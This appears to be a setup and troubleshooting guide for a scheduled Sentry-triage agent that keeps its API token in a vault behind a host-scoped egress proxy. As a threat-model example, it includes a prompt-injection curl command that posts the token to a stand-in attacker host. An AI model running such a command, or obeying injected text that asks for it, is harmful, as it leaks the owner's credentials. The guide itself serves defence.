# Setup tips & tricks: scheduled Sentry triage with vault env-var credentials

Things that aren't obvious from the docs and tend to cost debugging time.

---

## Mental model

### Where the token lives

```
 your host                 Anthropic                      sandbox (container)
┌─────────────┐      ┌─────────────────────┐      ┌────────────────────────────┐
│ real token ─┼─────▶│ vault (encrypted)   │      │ SENTRY_AUTH_TOKEN=         │
└─────────────┘      │                     │      │   <opaque placeholder>     │
                     │ egress proxy        │◀─────┼─ sentry-cli / curl request │
                     │  placeholder→token  │      │   with placeholder in      │
                     │  IF host allowlisted│      │   Authorization header     │
                     └──────────┬──────────┘      └────────────────────────────┘
                                │ real token, only toward
                                ▼
                        api.sentry.io / *.sentry.io
```

An `environment_variable` vault credential is deliberately the only way to set env vars in a managed sandbox:

1. **The container never holds the real token.** It holds an opaque placeholder. `echo $SENTRY_AUTH_TOKEN` prints the placeholder, and so does anything that tries to exfiltrate the environment variable.
2. **Substitution is host-scoped.** The egress proxy swaps the placeholder for the token only on outbound requests to the credential's `allowed_hosts`. A prompt injection that runs `curl https://evil.example.com -d "$SENTRY_AUTH_TOKEN"` sends the placeholder.

What this doesn't give you: the agent can still *use* the credential for anything the allowlisted host permits. A token with `event:write` lets the agent resolve and modify issues. Pick scopes accordingly. The vault limits *where* the token can go, and Sentry scopes limit *what* it can do once there.

### Two allowlists, not one

| Config | What it gates |
|---|---|
| `environment.config.networking.allowed_hosts` | Can the sandbox open a connection to this host? |
| `credential.auth.networking.allowed_hosts` | Will the placeholder be replaced with the real secret for this host? |

Both need Sentry's hosts (`sentry.io`, `*.sentry.io`). Set only the environment's and every API call returns 401 with the placeholder. Set only the credential's and the connection never opens. There's also an `unrestricted` credential networking type for CLIs whose host list you don't know up front, but the allowlist is the stronger guarantee: it's the difference between "this token works against Sentry" and "this token works anywhere the agent can be talked into sending it."

### A deployment is the whole host process

A **deployment** bundles the agent, environment, vault, and initial user message with a cron schedule. Sessions start themselves on Anthropic infra. Nothing runs on your machine after `deploy.py`.

---

## Gotchas

### The system prompt is stored, so keep secret tokens out of it

System prompts and user messages land in the session's event history. Put org and project slugs there (`agent_config.py` interpolates `SENTRY_ORG` and `SENTRY_PROJECT`), never the token. The token only ever goes into the vault credential.

### `*.sentry.io` does not cover `sentry.io`

The wildcard matches subdomains only. Allowlist both `sentry.io` and `*.sentry.io` (the latter covers regional hosts like `us.sentry.io` and `de.sentry.io`).

### Changing env var name and values

To change the env var's name, archive the credential and create a new one. The replacement gets a different placeholder. In some scenarios, existing sessions can pick up the new credential, but to guarantee the new var is used, start fresh sessions after a rename.

When rotating the *value* you can update `secret_value` in place and new outbound requests will use it, including from running sessions. IDs are unchanged.

```python
client.beta.vaults.credentials.update(
    credential_id,
    vault_id=vault_id,
    auth={"type": "environment_variable", "secret_value": new_token},
)
```

### `networking.allowed_hosts` is replace-only on update

To add a host, send the full list including existing entries.

### The deployment pins an agent version

`agents.update` writes a new agent version, and sessions you start by hand use the latest. The deployment doesn't: it keeps the version it pinned at create time, so a prompt edit alone never reaches scheduled runs. `update_agent.py` does both halves: push the change with `agents.update` (which takes the current version as an optimistic lock), then `deployments.update(deployment_id, agent=agent_id)` to re-pin to the latest.

### Cron is wall-clock, with DST edges

`0 9 * * 1-5` in `America/New_York` fires at 9:00 AM Eastern regardless of DST. Times that don't exist on spring-forward day are skipped, and times that occur twice on fall-back day fire twice. If that matters, schedule outside 1–3 AM local or use UTC. Runs may start up to 10 seconds late, granularity is per-minute, and an org can have up to 1,000 deployments.

After `deployments.create`, check `schedule.upcoming_runs_at` in the response to confirm the expression fires when you expect (`deploy.py` prints it).

### Permanent failures auto-pause the deployment

`vault_not_found`, `agent_archived`, and `environment_archived` pause the deployment and set `paused_reason`, so a misconfigured deployment doesn't keep failing on schedule indefinitely. Transient failures (rate limits, backend errors) don't pause. `runs.py` lists both: every trigger writes a deployment run record with `error.code` when no session was produced.

### `pause` is not `archive`

`pause` stops future scheduled triggers. In-flight sessions keep running, and manual runs still work while paused. `unpause` resumes from the next occurrence (missed runs are not backfilled). `archive` is terminal.

### Report files lag the session by a few seconds

The agent writes to `/mnt/session/outputs/`, which the Files API captures automatically. Indexing can lag 1–3 seconds after the session goes idle, so `run_now.py` retries the empty list a few times before giving up.

---

## Setup checklist

1. Sentry → **Settings → Auth Tokens → Create New Token** with `org:read`, `project:read`, and `event:read` scopes. Copy the `sntrys_...` value.
2. `cp .env.example .env`, fill in `SENTRY_AUTH_TOKEN`, `SENTRY_ORG`, `SENTRY_PROJECT`. For Claude Platform auth, set `ANTHROPIC_API_KEY` or sign in once with [`ant auth login`](https://platform.claude.com/docs/en/api/sdks/cli). Either works.
3. `uv run python setup_agent.py` → copy the printed `CLAUDE_VAULT_ID`, `CLAUDE_AGENT_ID`, `CLAUDE_ENVIRONMENT_ID` into `.env`.
4. `uv run python deploy.py` → copy `CLAUDE_DEPLOYMENT_ID` into `.env`. Check the printed upcoming runs.
5. `uv run python run_now.py` → streams a manual run and downloads `TRIAGE_REPORT.md`. If the token is missing a scope or an allowlist is wrong, this is where it surfaces.
6. Done. The schedule fires without any host process. `uv run python runs.py` shows history.

To change the prompt or model later, edit `agent_config.py` and run `uv run python update_agent.py`. It pushes the change and re-pins the deployment (see the gotcha above).

To stop: `uv run python teardown.py` pauses and archives everything. Skip it to leave the schedule running.

## Debugging a failed run

| Symptom | Likely cause |
|---|---|
| `sentry-cli` gets 401 | Placeholder not substituted: host missing from the **credential's** `allowed_hosts`, or the request went to a host outside it |
| Connection refused / timeout from the sandbox | Host missing from the **environment's** `networking.allowed_hosts` |
| 403 from Sentry API | Token missing a scope (`org:read`, `project:read`, `event:read`) |
| `runs.py` shows `vault_not_found` and the deployment paused | Vault archived while the deployment still references it. Recreate and update the deployment |
| Scheduled time passed, no run record | Deployment paused (check `paused_reason`), or you're checking before the up-to-10s jitter |
| `run_now.py` finds no files | Report indexing lag. The script retries, but if it still comes up empty, check the streamed transcript for whether the agent wrote the file |

---

## Production notes

- Scope the Sentry token to a single project if you can. Read-only scopes mean a prompt injection can at worst read what the on-call engineer could.
- The report lands in the session's files, not your inbox. For delivery, register a `session.status_idled` webhook, download the report, and post it to Slack (the `managed_agents/slack` example has the webhook pattern).